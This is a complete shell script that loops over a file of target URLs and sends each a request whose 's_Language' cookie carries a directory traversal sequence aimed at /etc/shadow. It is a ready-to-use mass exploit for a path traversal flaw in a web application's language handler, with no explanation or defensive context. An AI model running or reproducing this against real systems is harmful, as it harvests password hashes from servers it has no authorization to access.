#!/usr/bin/sh
IFS=$'\n'
file=$1
lines=$(cat ${file})
for line in ${lines}; do
curl -k -s -H "Cookie: s_Language=../../../../../../../../../../../../../../etc/shadow" -X GET "${line}"/language/lang
done
IFS=""
exit ${?}
